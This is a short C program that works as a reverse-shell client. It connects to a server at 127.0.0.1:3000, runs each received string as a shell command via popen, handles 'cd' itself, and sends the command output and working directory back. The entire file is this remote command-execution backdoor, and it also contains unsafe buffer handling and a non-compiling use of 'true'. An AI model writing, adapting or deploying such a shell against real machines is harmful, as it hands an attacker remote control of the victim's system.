#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PORT (3000)
#define BUFFER_SIZE (1024)
#define SEPARATOR ("<SePaRaToR>")

int main() {
  int client_fd;
  struct sockaddr_in server_addr;
  char buffer[BUFFER_SIZE];
  char cwd[BUFFER_SIZE];
  FILE *fp;

  client_fd = socket(AF_INET, SOCK_STREAM, 0);

  if (client_fd < 0) {
    perror("socket setfup failed\n");
    return -1;
  }

  server_addr.sin_family = AF_INET;
  inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
  server_addr.sin_port = htons(PORT);

  if (connect(client_fd, (struct sockaddr *) &server_addr,
      sizeof(server_addr)) < 0) {
    perror("connection failed\n");
    return -1;
  }

  getcwd(cwd, BUFFER_SIZE);
  if (send(client_fd, cwd, BUFFER_SIZE, 0) < 0) {
    perror("send cwd failed");
    return -1;
  }

  while (1) {
    memset(buffer, 0, BUFFER_SIZE);
    if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
      perror("recv failed\n");
      return -1;
    }

    if (strncmp(buffer, "cd", 2) == 0) {
      strcpy(cwd, &buffer[3]);
      cwd[strlen(&buffer[2])] = '\0';

      if (chdir(cwd)) {
        perror("change directory failed");
        char chdir_fail_mesg[] = "Change Directroy Failed\n";
        strcpy(buffer, chdir_fail_mesg);
        buffer[strlen(chdir_fail_mesg)] = '\0';
      }

      getcwd(cwd, BUFFER_SIZE);

      strcat(buffer, "\n");
      strcat(buffer, SEPARATOR);
      strcat(buffer, cwd);

      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
        perror("send failed");
        return -1;
      }
    }
    else {
      if (chdir(cwd)) {
        perror("change directory failed");
        return -1;
      }
      fp = popen(buffer, "r");
      memset(buffer, 0, BUFFER_SIZE);
      if (!fp) {
        perror("peopen failed");
      }

      while (true) {
        char line[BUFFER_SIZE];
        int status = fscanf(fp, "%[^\n]%*c", line);
        if (status != 1) {
          break;
        }
        strcat(buffer, line);
        strcat(buffer, "\n");
      }

      strcat(buffer, SEPARATOR);
      strcat(buffer, cwd);

      printf("%s\n", buffer);
      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
        perror("send failed");
        return -1;
      }
      pclose(fp);
    }
  }
}